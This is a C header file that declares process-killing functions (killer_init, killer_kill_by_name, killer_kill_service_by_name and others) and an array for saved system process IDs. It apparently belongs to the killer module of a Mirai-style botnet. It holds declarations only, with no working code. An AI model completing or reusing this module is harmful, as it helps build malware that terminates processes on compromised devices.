#pragma once
#define MAX_PUSHES 10
#define MAX_SYSPROCS 10
void killer_init(void);
void killer_kill(void);
void killer();
void killer_kill_by_name(char *);
void killer_kill_by_deleted();
void killer_kill_by_group();
void killer_kill_by_array();
void killer_kill_service_by_name(char *);
void killer_save_by_sysproc();
void read_pid_name(char *);
void killer_total_killed();
void killer_kill_by_service(char *);

struct save_proc_node{
    int save_pid;
};




struct save_proc_node savesysproc[MAX_SYSPROCS];